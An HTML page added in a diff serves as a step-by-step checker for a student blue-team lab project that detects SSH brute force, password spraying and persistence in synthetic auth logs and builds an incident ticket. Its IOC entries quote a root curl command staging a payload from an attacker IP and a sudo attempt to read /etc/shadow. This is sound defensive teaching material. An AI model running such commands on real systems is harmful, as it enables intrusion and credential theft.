@@ -1,0 +1,431 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>GraySentinel Day 1 · Eswar Mahalingam · Step-by-step checker</title>
+<style>:root{--bg:#0b1220;--card:#111a2e;--line:#1f2a44;--txt:#e5e7eb;--mut:#94a3b8;--gold:#e4a11b;--ok:#34d399;--red:#f87171}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--txt);font:15px/1.55 system-ui,Segoe UI,Arial}header{background:linear-gradient(120deg,#0b1f4d,#0b1220);border-bottom:1px solid var(--line);padding:26px 20px}
+.wrap{max-width:1000px;margin:0 auto}h1{margin:0;font-size:24px}h1 small{display:block;font-size:13px;color:var(--gold);font-weight:600;letter-spacing:.08em;text-transform:uppercase;margin-bottom:6px}header p{color:var(--mut);margin:8px 0 0}
+.bar{position:sticky;top:0;background:#0b1220ee;backdrop-filter:blur(6px);border-bottom:1px solid var(--line);padding:10px 20px;z-index:5}.bar .wrap{display:flex;gap:14px;align-items:center;flex-wrap:wrap}
+.prog{flex:1;height:10px;background:#1e293b;border-radius:6px;overflow:hidden;min-width:160px}.prog i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--gold),var(--ok));transition:width .3s}
+.btn{background:#1e293b;border:1px solid var(--line);color:var(--txt);padding:6px 12px;border-radius:6px;text-decoration:none;font-size:13px}.btn:hover{border-color:var(--gold)}
+.tabs{display:flex;gap:8px;margin:18px 0}.tabs a{padding:6px 14px;border-radius:20px;border:1px solid var(--line);color:var(--mut);text-decoration:none;font-size:13px}.tabs a.on{color:#0b1220;background:var(--gold);border-color:var(--gold);font-weight:700}
+.step{display:flex;gap:16px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:18px;margin:14px 0}.step.done{border-color:var(--ok)}.num{flex:0 0 42px;height:42px;border-radius:50%;background:var(--gold);color:#0b1220;font-weight:800;display:flex;align-items:center;justify-content:center;font-size:18px}.step.done .num{background:var(--ok)}
+.body{flex:1;min-width:0}.tag{font-size:11px;color:var(--gold);font-weight:700;letter-spacing:.1em}h3{margin:2px 0 10px;font-size:17px}.lbl{font-size:11px;text-transform:uppercase;color:var(--mut);letter-spacing:.08em;margin-top:8px}
+pre{background:#0a0f1c;border:1px solid var(--line);border-radius:6px;padding:10px 12px;overflow:auto;font:13px/1.45 ui-monospace,Menlo,Consolas,monospace;margin:4px 0}pre.cmd{color:#fde68a}pre.out{color:#cbd5e1;max-height:420px}.exp{margin:4px 0;color:var(--ok)}
+details summary{cursor:pointer;color:var(--mut);font-size:13px;margin-top:6px}.chk{display:block;margin-top:10px;font-size:13px;color:var(--mut)}.chk input{accent-color:var(--ok);margin-right:6px}
+.pane{display:none}.pane.on{display:block}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px}.card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:14px}.card b{display:block;color:var(--gold);font-size:12px;text-transform:uppercase;letter-spacing:.08em}.card a{color:#93c5fd;text-decoration:none;display:block;margin-top:4px;font-size:14px}
+.md{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:18px;white-space:pre-wrap;font:13px/1.5 ui-monospace,Menlo,Consolas,monospace;color:#cbd5e1;overflow:auto;max-height:70vh}img{max-width:100%;border:1px solid var(--line);border-radius:8px;margin:8px 0}
+footer{color:var(--mut);font-size:12px;text-align:center;padding:30px 20px}</style></head><body>
+<header><div class="wrap"><h1><small>GraySentinel Cyber Defence Lab · Day 1 · Candidate 13 · Blue Team</small>Eswar Mahalingam — Project 01 &amp; 02 · Live step-by-step checker</h1>
+<p>Reproduce and verify both projects in 9 steps (plus setup). Each step shows the exact command, the expected result, and the <em>real captured terminal output</em> from <code>evidence/terminal_output.txt</code>. Tick each step as you verify it — progress is saved in your browser.</p></div></header>
+<div class="bar"><div class="wrap"><strong id="pct">0 / 9 verified</strong><div class="prog"><i id="fill"></i></div><a class="btn" href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/README.md">Repo README</a><a class="btn" href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-01/README.md">P01 README</a><a class="btn" href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/project-02/README.md">P02 README</a><a class="btn" href="https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026/blob/main/graysentinel-day1/STEP_BY_STEP.md">Runbook .md</a><a class="btn" id="reset" href="#">Reset ticks</a></div></div>
+<main class="wrap"><nav class="tabs"><a href="#steps" class="on" data-p="steps">Step-by-step</a><a href="#p01" data-p="p01">P01 findings report</a><a href="#p02" data-p="p02">P02 incident ticket</a><a href="#shots" data-p="shots">Screenshots</a><a href="#files" data-p="files">All files</a></nav>
+<div class="pane on" id="pane-steps"><section class="step" style="border-color:var(--gold)"><div class="num">0</div><div class="body"><div class="tag">SETUP</div><h3>Clone — nothing to install (Python 3.8+ stdlib only)</h3><pre class="cmd">git clone https://github.com/Eswar5313/GraySentinel-DSOU-Day1-ZeroDay-2026.git
+cd GraySentinel-DSOU-Day1-ZeroDay-2026/graysentinel-day1</pre><p class="exp">All data is synthetic and sanitised (RFC-5737 ranges). Safe to run anywhere.</p></div></section><section class="step" id="s1"><div class="num">1</div><div class="body"><div class="tag">P01</div><h3>Generate the synthetic lab log</h3>
+<div class="lbl">Command</div><pre class="cmd">cd project-01 &amp;&amp; python3 data/make_lab_data.py</pre><div class="lbl">Expected result</div><p class="exp">wrote auth.log with 135 lines</p>
+<details><summary>Show actual captured output</summary><pre class="out">$ python3 data/make_lab_data.py
+wrote auth.log with 135 lines</pre></details>
+<label class="chk"><input type="checkbox" data-k="s1"> I ran this and got the expected result</label></div></section><section class="step" id="s2"><div class="num">2</div><div class="body"><div class="tag">P01</div><h3>Inspect the raw log</h3>
+<div class="lbl">Command</div><pre class="cmd">wc -l data/auth.log &amp;&amp; head -5 data/auth.log</pre><div class="lbl">Expected result</div><p class="exp">135 lines; sshd/sudo/su/useradd/usermod events from soc-lab-01</p>
+<details><summary>Show actual captured output</summary><pre class="out">$ wc -l data/auth.log &amp;&amp; head -5 data/auth.log
+135 data/auth.log
+Sep 13 22:16:00 soc-lab-01 sshd[4101]: Accepted publickey for ops from 192.0.2.52 port 51295 ssh2: RSA SHA256:LabKeyops
+Sep 13 22:16:01 soc-lab-01 sshd[4104]: pam_unix(sshd:session): session opened for user ops by (uid=0)
+Sep 13 22:28:00 soc-lab-01 sshd[4105]: Accepted publickey for arjun from 192.0.2.44 port 49328 ssh2: RSA SHA256:LabKeyarjun
+Sep 13 22:28:01 soc-lab-01 sshd[4108]: pam_unix(sshd:session): session opened for user arjun by (uid=0)
+Sep 13 22:36:00 soc-lab-01 sshd[4109]: Accepted publickey for deploy from 192.0.2.24 port 43460 ssh2: RSA SHA256:LabKeydeploy</pre></details>
+<label class="chk"><input type="checkbox" data-k="s2"> I ran this and got the expected result</label></div></section><section class="step" id="s3"><div class="num">3</div><div class="body"><div class="tag">P01</div><h3>Run the investigation</h3>
+<div class="lbl">Command</div><pre class="cmd">python3 src/auth_investigator.py --log data/auth.log --out evidence/findings.json --md evidence/findings.md</pre><div class="lbl">Expected result</div><p class="exp">10 findings, 2 CRITICAL (F03 success-after-failures, F10 sudo-group grant); exit code 2</p>
+<details><summary>Show actual captured output</summary><pre class="out">$ python3 src/auth_investigator.py --log data/auth.log --out evidence/findings.json --md evidence/findings.md
+Parsed 135 events from data/auth.log
+Event mix: {&#x27;ssh_ok&#x27;: 26, &#x27;other&#x27;: 20, &#x27;sudo_ok&#x27;: 3, &#x27;ssh_invalid_user&#x27;: 24, &#x27;ssh_fail&#x27;: 55, &#x27;useradd&#x27;: 1, &#x27;usermod&#x27;: 1, &#x27;sudo_fail&#x27;: 4, &#x27;su_attempt&#x27;: 1}
+
+10 finding(s):
+  [CRITICAL] F03  Successful login after failure burst (likely compromised credential) src=203.0.113.45    n=38
+  [CRITICAL] F10  Account added to privileged group                              src=local           n=1
+  [HIGH    ] F01  SSH brute force (many failures from one source)                src=203.0.113.45    n=37
+  [HIGH    ] F09  New local account created                                      src=local           n=1
+  [HIGH    ] F08  Privileged command fetched/staged a remote payload             src=local           n=1
+  [HIGH    ] F02  Password spraying (one source, many accounts)                  src=198.51.100.77   n=16
+  [HIGH    ] F06  Repeated failed sudo (local privilege-escalation probing)      src=local           n=4
+  [MEDIUM  ] F04  Privileged account login outside business hours                src=203.0.113.45    n=1
+  [MEDIUM  ] F05  Username enumeration / invalid-user probing                    src=198.51.100.77   n=16
+  [MEDIUM  ] F07  su to root attempted                                           src=local           n=1
+
+JSON  -&gt; evidence/findings.json
+MD    -&gt; evidence/findings.md
+exit code: 2 (2 = CRITICAL finding present)</pre></details>
+<label class="chk"><input type="checkbox" data-k="s3"> I ran this and got the expected result</label></div></section><section class="step" id="s4"><div class="num">4</div><div class="body"><div class="tag">P01</div><h3>Run the 13 unit tests</h3>
+<div class="lbl">Command</div><pre class="cmd">python3 -m unittest -v tests.test_auth_investigator</pre><div class="lbl">Expected result</div><p class="exp">Ran 13 tests … OK</p>
+<details><summary>Show actual captured output</summary><pre class="out">$ python3 -m unittest -v tests.test_auth_investigator
+test_account_manipulation (tests.test_auth_investigator.DetectionTests.test_account_manipulation) ... ok
+test_brute_force_fires_at_threshold (tests.test_auth_investigator.DetectionTests.test_brute_force_fires_at_threshold) ... ok
+test_findings_sorted_by_severity (tests.test_auth_investigator.DetectionTests.test_findings_sorted_by_severity) ... ok
+test_off_hours_root_login (tests.test_auth_investigator.DetectionTests.test_off_hours_root_login) ... ok
+test_password_spray (tests.test_auth_investigator.DetectionTests.test_password_spray) ... ok
+test_success_after_burst_is_critical (tests.test_auth_investigator.DetectionTests.test_success_after_burst_is_critical) ... ok
+test_success_outside_window_not_linked (tests.test_auth_investigator.DetectionTests.test_success_outside_window_not_linked) ... ok
+test_sudo_failures_and_su (tests.test_auth_investigator.DetectionTests.test_sudo_failures_and_su) ... ok
+test_two_typos_are_not_an_incident (tests.test_auth_investigator.DetectionTests.test_two_typos_are_not_an_incident) ... ok
+test_empty_file (tests.test_auth_investigator.ParseTests.test_empty_file) ... ok
+test_garbage_lines_are_skipped_not_fatal (tests.test_auth_investigator.ParseTests.test_garbage_lines_are_skipped_not_fatal) ... [warn] 2 line(s) did not match the syslog auth format and were skipped
+ok
+test_invalid_user_flag (tests.test_auth_investigator.ParseTests.test_invalid_user_flag) ... ok
+test_parses_failed_and_accepted (tests.test_auth_investigator.ParseTests.test_parses_failed_and_accepted) ... ok
+
+----------------------------------------------------------------------
+Ran 13 tests in 0.011s
+
+OK</pre></details>
+<label class="chk"><input type="checkbox" data-k="s4"> I ran this and got the expected result</label></div></section><section class="step" id="s5"><div class="num">5</div><div class="body"><div class="tag">P01</div><h3>Edge cases: tuned thresholds + garbage input</h3>
+<div class="lbl">Command</div><pre class="cmd">python3 src/auth_investigator.py --log data/auth.log --bf-threshold 50 --spray-users 20 --quiet
+printf &#x27;garbage line\n&#x27; &gt; /tmp/bad.log &amp;&amp; python3 src/auth_investigator.py --log /tmp/bad.log</pre><div class="lbl">Expected result</div><p class="exp">CRITICAL still fires (exit 2); garbage input warned + skipped (exit 0), no crash</p>
+<details><summary>Show actual captured output</summary><pre class="out">$ python3 src/auth_investigator.py --log data/auth.log --bf-threshold 50 --spray-users 20 --quiet; echo exit=$?
+exit=2  (tuned thresholds: brute-force/spray suppressed, CRITICAL still fires)
+
+$ printf &quot;garbage line
+
+&quot; &gt; /tmp/bad.log &amp;&amp; python3 src/auth_investigator.py --log /tmp/bad.log
+[warn] 1 line(s) did not match the syslog auth format and were skipped
+Parsed 0 events from /tmp/bad.log
+Event mix: {}
+
+0 finding(s):
+exit=0  (edge case: garbage input handled, no crash)</pre></details>
+<label class="chk"><input type="checkbox" data-k="s5"> I ran this and got the expected result</label></div></section><section class="step" id="s6"><div class="num">6</div><div class="body"><div class="tag">P02</div><h3>Generate the incident ticket from Project 01 findings</h3>
+<div class="lbl">Command</div><pre class="cmd">cd ../project-02 &amp;&amp; python3 src/incident_summary.py --findings data/findings.json --md evidence/incident_summary.md --html evidence/incident_summary.html --json evidence/incident_summary.json</pre><div class="lbl">Expected result</div><p class="exp">GS-INC-…-701 · CRITICAL / P1 · risk 100/100 · 23 IOCs · 9 ATT&amp;CK techniques · &#x27;Chain: …&#x27; narrative</p>
+<details><summary>Show actual captured output</summary><pre class="out">$ python3 src/incident_summary.py --findings data/findings.json --md evidence/incident_summary.md --html evidence/incident_summary.html --json evidence/incident_summary.json
+Incident GS-INC-20260915-805  severity=CRITICAL priority=P1 risk=100/100
+Findings: {&#x27;CRITICAL&#x27;: 2, &#x27;HIGH&#x27;: 5, &#x27;MEDIUM&#x27;: 3}   IOCs: 23   ATT&amp;CK: 9 techniques
+Executive summary:
+  - 10 security findings were raised on the monitored host between 00:05 and 09:30 on 2026-09-14.
+  - Overall severity is CRITICAL (priority P1); risk score 100/100; confidence: HIGH.
+  - The highest-impact finding is: Successful login after failure burst (likely compromised credential) (203.0.113.45).
+Narrative:
+  * Chain: credential guessing → successful root login → new account + sudo grant (persistence). This is a confirmed intrusion, not a scan.
+  * From 203.0.113.45: the attacker at 203.0.113.45 — 00:05 — successful login after failure burst (likely compromised credential) (admin, root); then 00:05 — ssh brute force (many failures from one source) (admin, root); then 00:06 — privileged account login outside business hours (root).
+  * From local: an actor already on the host — 00:08 — new local account created (svc_backup); then 00:09 — account added to privileged group (svc_backup); then 00:09 — privileged command fetched/staged a remote payload (root); then 09:00 — repeated failed sudo (local privilege-escalation probing) (arjun); then 09:30 — su to root attempted (arjun).
+  * From 198.51.100.77: the attacker at 198.51.100.77 — 01:40 — password spraying (one source, many accounts) (alice, bob, carol); then 01:40 — username enumeration / invalid-user probing (alice, bob, carol).
+MD   -&gt; evidence/incident_summary.md
+HTML -&gt; evidence/incident_summary.html
+JSON -&gt; evidence/incident_summary.json</pre></details>
+<label class="chk"><input type="checkbox" data-k="s6"> I ran this and got the expected result</label></div></section><section class="step" id="s7"><div class="num">7</div><div class="body"><div class="tag">P02</div><h3>Generic CSV input works too</h3>
+<div class="lbl">Command</div><pre class="cmd">python3 src/incident_summary.py --csv data/alerts_sample.csv --md evidence/incident_summary_from_csv.md</pre><div class="lbl">Expected result</div><p class="exp">HIGH / P2 from 3 alerts; no &#x27;Chain:&#x27; line</p>
+<details><summary>Show actual captured output</summary><pre class="out">$ python3 src/incident_summary.py --csv data/alerts_sample.csv --md evidence/incident_summary_from_csv.md
+Incident GS-INC-20260915-977  severity=HIGH priority=P2 risk=55/100
+Findings: {&#x27;HIGH&#x27;: 1, &#x27;MEDIUM&#x27;: 1, &#x27;LOW&#x27;: 1}   IOCs: 4   ATT&amp;CK: 3 techniques
+Executive summary:
+  - 3 security findings were raised on the monitored host between 02:09 and 03:02 on 2026-09-14.
+  - Overall severity is HIGH (priority P2); risk score 55/100; confidence: MEDIUM.
+  - The highest-impact finding is: SSH brute force (many failures from one source) (203.0.113.200).
+Narrative:
+  * From 203.0.113.200: the attacker at 203.0.113.200 — 02:09 — username enumeration / invalid-user probing (test, guest, oracle); then 02:10 — ssh brute force (many failures from one source) (root, admin).
+  * From 192.0.2.30: the attacker at 192.0.2.30 — 03:02 — privileged account login outside business hours (root).
+MD   -&gt; evidence/incident_summary_from_csv.md</pre></details>
+<label class="chk"><input type="checkbox" data-k="s7"> I ran this and got the expected result</label></div></section><section class="step" id="s8"><div class="num">8</div><div class="body"><div class="tag">P02</div><h3>Run the 12 unit tests</h3>
+<div class="lbl">Command</div><pre class="cmd">python3 -m unittest -v tests.test_incident_summary</pre><div class="lbl">Expected result</div><p class="exp">Ran 12 tests … OK</p>
+<details><summary>Show actual captured output</summary><pre class="out">$ python3 -m unittest -v tests.test_incident_summary
+test_attack_chain_is_named_when_bf_then_success (tests.test_incident_summary.CorrelationAndIOCs.test_attack_chain_is_named_when_bf_then_success) ... ok
+test_iocs_dedupe_ips_and_flag_commands (tests.test_incident_summary.CorrelationAndIOCs.test_iocs_dedupe_ips_and_flag_commands) ... ok
+test_playbook_lookup (tests.test_incident_summary.CorrelationAndIOCs.test_playbook_lookup) ... ok
+test_cli_writes_files (tests.test_incident_summary.EndToEnd.test_cli_writes_files) ... /home/claude/gs/graysentinel-day1/project-02/tests/../src/incident_summary.py:271: ResourceWarning: unclosed file &lt;_io.TextIOWrapper name=&#x27;/tmp/tmp8897ufrl/o.md&#x27; mode=&#x27;w&#x27; encoding=&#x27;utf-8&#x27;&gt;
+  open(a.md, &quot;w&quot;).write(to_markdown(inc))
+ResourceWarning: Enable tracemalloc to get the object allocation traceback
+/home/claude/gs/graysentinel-day1/project-02/tests/../src/incident_summary.py:275: ResourceWarning: unclosed file &lt;_io.TextIOWrapper name=&#x27;/tmp/tmp8897ufrl/o.json&#x27; mode=&#x27;w&#x27; encoding=&#x27;utf-8&#x27;&gt;
+  json.dump(inc, open(a.json, &quot;w&quot;), indent=2, default=str)
+ResourceWarning: Enable tracemalloc to get the object allocation traceback
+/home/claude/gs/graysentinel-day1/project-02/tests/test_incident_summary.py:99: ResourceWarning: unclosed file &lt;_io.TextIOWrapper name=&#x27;/tmp/tmp8897ufrl/o.json&#x27; mode=&#x27;r&#x27; encoding=&#x27;utf-8&#x27;&gt;
+  self.assertEqual(json.load(open(js))[&quot;severity&quot;], &quot;CRITICAL&quot;)
+ResourceWarning: Enable tracemalloc to get the object allocation traceback
+ok
+test_csv_input (tests.test_incident_summary.EndToEnd.test_csv_input) ... ok
+test_empty_findings_do_not_crash (tests.test_incident_summary.EndToEnd.test_empty_findings_do_not_crash) ... ok
+test_json_input_full_build (tests.test_incident_summary.EndToEnd.test_json_input_full_build) ... ok
+test_renderers_produce_all_sections (tests.test_incident_summary.EndToEnd.test_renderers_produce_all_sections) ... ok
+test_confidence_levels (tests.test_incident_summary.SeverityLogic.test_confidence_levels) ... ok
+test_overall_severity_is_worst_finding (tests.test_incident_summary.SeverityLogic.test_overall_severity_is_worst_finding) ... ok
+test_priority_mapping (tests.test_incident_summary.SeverityLogic.test_priority_mapping) ... ok
+test_risk_score_bounds_and_monotonic (tests.test_incident_summary.SeverityLogic.test_risk_score_bounds_and_monotonic) ... ok
+
+----------------------------------------------------------------------
+Ran 12 tests in 0.009s
+
+OK</pre></details>
+<label class="chk"><input type="checkbox" data-k="s8"> I ran this and got the expected result</label></div></section><section class="step" id="s9"><div class="num">9</div><div class="body"><div class="tag">P02</div><h3>Read the ticket</h3>
+<div class="lbl">Command</div><pre class="cmd">head -20 evidence/incident_summary.md  (or open evidence/incident_summary.html)</pre><div class="lbl">Expected result</div><p class="exp">Priority P1, SLA 15 min, notify SOC Lead + IR Manager + system owner</p>
+<details><summary>Show actual captured output</summary><pre class="out">$ head -20 evidence/incident_summary.md
+# SOC Incident Summary — GS-INC-20260915-805
+
+| Field | Value |
+|---|---|
+| **Severity / Priority** | **CRITICAL / P1** |
+| Risk score | 100 / 100 |
+| Confidence | HIGH — multiple independent findings corroborate a single attack chain |
+| Response SLA | 15 min |
+| Notify | SOC Lead + IR Manager + system owner; page on-call |
+| Activity window | 2026-09-14 00:05:01 → 2026-09-14 09:30:00 |
+| Events analysed | 135 |
+| Findings | CRITICAL: 2, HIGH: 5, MEDIUM: 3 |
+| Analyst | Eswar Mahalingam (Blue Team, GS-STU-DSOU-2026-039A) |
+| Generated | 2026-09-15 01:26:43 |
+| Source | `data/findings.json` |
+
+## 1. Executive summary
+
+- 10 security findings were raised on the monitored host between 00:05 and 09:30 on 2026-09-14.
+- Overall severity is CRITICAL (priority P1); risk score 100/100; confidence: HIGH.</pre></details>
+<label class="chk"><input type="checkbox" data-k="s9"> I ran this and got the expected result</label></div></section></div>
+<div class="pane" id="pane-p01"><h2>Project 01 — findings.md (generated by the tool)</h2><div class="md"># Authentication Log Investigation — Findings
+
+**Source log:** `data/auth.log`  
+**Events parsed:** 135  
+**Time range:** 2026-09-13 22:16:00 → 2026-09-14 11:11:00  
+**Findings:** 10 (CRITICAL: 2, HIGH: 5, MEDIUM: 3)
+
+## Event mix
+
+| Type | Count |
+|---|---|
+| ssh_fail | 55 |
+| ssh_ok | 26 |
+| ssh_invalid_user | 24 |
+| other | 20 |
+| sudo_fail | 4 |
+| sudo_ok | 3 |
+| useradd | 1 |
+| usermod | 1 |
+| su_attempt | 1 |
+
+## Top source IPs
+
+| IP | Events |
+|---|---|
+| 203.0.113.45 | 46 |
+| 198.51.100.77 | 32 |
+| 192.0.2.14 | 5 |
+| 192.0.2.44 | 2 |
+| 192.0.2.32 | 2 |
+
+## Findings
+
+| ID | Severity | Title | Source | Users | Events | First seen | Last seen | ATT&amp;CK |
+|---|---|---|---|---|---|---|---|---|
+| F03 | **CRITICAL** | Successful login after failure burst (likely compromised credential) | `203.0.113.45` | admin, root | 38 | 00:05:01 | 00:06:42 | T1078 Valid Accounts |
+| F10 | **CRITICAL** | Account added to privileged group | `local` | svc_backup | 1 | 00:09:02 | 00:09:02 | T1098 Account Manipulation |
+| F01 | **HIGH** | SSH brute force (many failures from one source) | `203.0.113.45` | admin, root | 37 | 00:05:01 | 00:06:39 | T1110.001 Password Guessing |
+| F09 | **HIGH** | New local account created | `local` | svc_backup | 1 | 00:08:42 | 00:08:42 | T1136.001 Create Account: Local |
+| F08 | **HIGH** | Privileged command fetched/staged a remote payload | `local` | root | 1 | 00:09:42 | 00:09:42 | T1105 Ingress Tool Transfer |
+| F02 | **HIGH** | Password spraying (one source, many accounts) | `198.51.100.77` | alice, bob, carol, dave… | 16 | 01:40:33 | 01:49:19 | T1110.003 Password Spraying |
+| F06 | **HIGH** | Repeated failed sudo (local privilege-escalation probing) | `local` | arjun | 4 | 09:00:15 | 09:01:00 | T1548.003 Sudo and Sudo Caching |
+| F04 | **MEDIUM** | Privileged account login outside business hours | `203.0.113.45` | root | 1 | 00:06:42 | 00:06:42 | T1078 Valid Accounts |
+| F05 | **MEDIUM** | Username enumeration / invalid-user probing | `198.51.100.77` | alice, bob, carol, dave… | 16 | 01:40:33 | 01:49:19 | T1087 Account Discovery |
+| F07 | **MEDIUM** | su to root attempted | `local` | arjun | 1 | 09:30:00 | 09:30:00 | T1548 Abuse Elevation Control Mechanism |
+
+### F03 · CRITICAL · Successful login after failure burst (likely compromised credential)
+
+&#x27;root&#x27; accepted via password from 203.0.113.45 after 37 failures in the preceding 10 min. Treat the account and host as compromised until proven otherwise.
+
+- Source: `203.0.113.45` · Users: admin, root
+- Evidence lines in log: 27, 28, 29, 30, 31, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43…
+
+### F10 · CRITICAL · Account added to privileged group
+
+&#x27;svc_backup&#x27; added to &#x27;sudo&#x27; — backdoor admin pattern.
+
+- Source: `local` · Users: svc_backup
+- Evidence lines in log: 74
+
+### F01 · HIGH · SSH brute force (many failures from one source)
+
+37 failed passwords in 1.6 min (22.7/min); primary target &#x27;root&#x27; (29 attempts).
+
+- Source: `203.0.113.45` · Users: admin, root
+- Evidence lines in log: 27, 28, 29, 30, 31, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43…
+
+### F09 · HIGH · New local account created
+
+Account &#x27;svc_backup&#x27; created — verify against change tickets.
+
+- Source: `local` · Users: svc_backup
+- Evidence lines in log: 73
+
+### F08 · HIGH · Privileged command fetched/staged a remote payload
+
+&#x27;root&#x27; ran as root: /usr/bin/curl -s http://203.0.113.45/x.sh -o /tmp/x.sh
+
+- Source: `local` · Users: root
+- Evidence lines in log: 75
+
+### F02 · HIGH · Password spraying (one source, many accounts)
+
+16 failures across 16 distinct usernames, max 1 attempt(s) per user — the signature of spraying a single password against a user list to stay under lockout thresholds.
+
+- Source: `198.51.100.77` · Users: alice, bob, carol, dave, erin, frank, grace, heidi, ivan, judy, mallory, oscar, peggy, trent, victor, walter
+- Evidence lines in log: 88, 90, 92, 94, 96, 98, 100, 102, 104, 108, 110, 112, 114, 116, 118…
+
+### F06 · HIGH · Repeated failed sudo (local privilege-escalation probing)
+
+&#x27;arjun&#x27; failed sudo 12 times; last command attempted: /bin/cat /etc/shadow
+
+- Source: `local` · Users: arjun
+- Evidence lines in log: 124, 125, 126, 127
+
+### F04 · MEDIUM · Privileged account login outside business hours
+
+&#x27;root&#x27; logged in at 00:06 (allowed window 08:00–20:00).
+
+- Source: `203.0.113.45` · Users: root
+- Evidence lines in log: 71
+
+### F05 · MEDIUM · Username enumeration / invalid-user probing
+
+16 non-existent usernames tried: alice, bob, carol, dave, erin, frank, grace, heidi….
+
+- Source: `198.51.100.77` · Users: alice, bob, carol, dave, erin, frank, grace, heidi, ivan, judy, mallory, oscar, peggy, trent, victor, walter
+- Evidence lines in log: 87, 89, 91, 93, 95, 97, 99, 101, 103, 107, 109, 111, 113, 115, 117…
+
+### F07 · MEDIUM · su to root attempted
+
+&#x27;arjun&#x27; attempted &#x27;su root&#x27; on pts/1.
+
+- Source: `local` · Users: arjun
+- Evidence lines in log: 128
+</div></div>
+<div class="pane" id="pane-p02"><h2>Project 02 — incident_summary.md (generated by the tool)</h2><p><a class="btn" href="../project-02/evidence/incident_summary.html">Open the HTML ticket</a></p><div class="md"># SOC Incident Summary — GS-INC-20260915-805
+
+| Field | Value |
+|---|---|
+| **Severity / Priority** | **CRITICAL / P1** |
+| Risk score | 100 / 100 |
+| Confidence | HIGH — multiple independent findings corroborate a single attack chain |
+| Response SLA | 15 min |
+| Notify | SOC Lead + IR Manager + system owner; page on-call |
+| Activity window | 2026-09-14 00:05:01 → 2026-09-14 09:30:00 |
+| Events analysed | 135 |
+| Findings | CRITICAL: 2, HIGH: 5, MEDIUM: 3 |
+| Analyst | Eswar Mahalingam (Blue Team, GS-STU-DSOU-2026-039A) |
+| Generated | 2026-09-15 01:26:43 |
+| Source | `data/findings.json` |
+
+## 1. Executive summary
+
+- 10 security findings were raised on the monitored host between 00:05 and 09:30 on 2026-09-14.
+- Overall severity is CRITICAL (priority P1); risk score 100/100; confidence: HIGH.
+- The highest-impact finding is: Successful login after failure burst (likely compromised credential) (203.0.113.45).
+
+## 2. Attack narrative
+
+1. Chain: credential guessing → successful root login → new account + sudo grant (persistence). This is a confirmed intrusion, not a scan.
+2. From 203.0.113.45: the attacker at 203.0.113.45 — 00:05 — successful login after failure burst (likely compromised credential) (admin, root); then 00:05 — ssh brute force (many failures from one source) (admin, root); then 00:06 — privileged account login outside business hours (root).
+3. From local: an actor already on the host — 00:08 — new local account created (svc_backup); then 00:09 — account added to privileged group (svc_backup); then 00:09 — privileged command fetched/staged a remote payload (root); then 09:00 — repeated failed sudo (local privilege-escalation probing) (arjun); then 09:30 — su to root attempted (arjun).
+4. From 198.51.100.77: the attacker at 198.51.100.77 — 01:40 — password spraying (one source, many accounts) (alice, bob, carol); then 01:40 — username enumeration / invalid-user probing (alice, bob, carol).
+
+## 3. Timeline
+
+| Time | End | ID | Severity | Finding | Source | Accounts | Events |
+|---|---|---|---|---|---|---|---|
+| 00:05:01 | 00:06:42 | F03 | CRITICAL | Successful login after failure burst (likely compromised credential) | `203.0.113.45` | admin, root | 38 |
+| 00:05:01 | 00:06:39 | F01 | HIGH | SSH brute force (many failures from one source) | `203.0.113.45` | admin, root | 37 |
+| 00:06:42 | 00:06:42 | F04 | MEDIUM | Privileged account login outside business hours | `203.0.113.45` | root | 1 |
+| 00:08:42 | 00:08:42 | F09 | HIGH | New local account created | `local` | svc_backup | 1 |
+| 00:09:02 | 00:09:02 | F10 | CRITICAL | Account added to privileged group | `local` | svc_backup | 1 |
+| 00:09:42 | 00:09:42 | F08 | HIGH | Privileged command fetched/staged a remote payload | `local` | root | 1 |
+| 01:40:33 | 01:49:19 | F02 | HIGH | Password spraying (one source, many accounts) | `198.51.100.77` | alice, bob, carol… | 16 |
+| 01:40:33 | 01:49:19 | F05 | MEDIUM | Username enumeration / invalid-user probing | `198.51.100.77` | alice, bob, carol… | 16 |
+| 09:00:15 | 09:01:00 | F06 | HIGH | Repeated failed sudo (local privilege-escalation probing) | `local` | arjun | 4 |
+| 09:30:00 | 09:30:00 | F07 | MEDIUM | su to root attempted | `local` | arjun | 1 |
+
+## 4. Indicators of Compromise
+
+| Type | Value | Seen in | Recommended action |
+|---|---|---|---|
+| IPv4 | `203.0.113.45` | Successful login after failure burst (likely compromised credential) | Block at perimeter; add to threat-intel watchlist; search other logs |
+| Account | `admin` | Successful login after failure burst (likely compromised credential) | Disable + reset credential; review sessions |
+| Account | `root` | Successful login after failure burst (likely compromised credential) | Disable + reset credential; review sessions |
+| Account | `svc_backup` | Account added to privileged group | Disable + reset credential; review sessions |
+| Command | `/usr/bin/curl -s http://203.0.113.45/x.sh -o /tmp/x.sh` | Privileged command fetched/staged a remote payload | Check for dropped files; hash and sandbox any payload |
+| IPv4 | `198.51.100.77` | Password spraying (one source, many accounts) | Block at perimeter; add to threat-intel watchlist; search other logs |
+| Account | `alice` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `bob` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `carol` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `dave` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `erin` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `frank` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `grace` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `heidi` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `ivan` | Password spraying (one source, many accounts) | Force password reset; monitor |
+| Account | `judy` | Password spraying (one source, many accounts) | Force password reset; monitor |
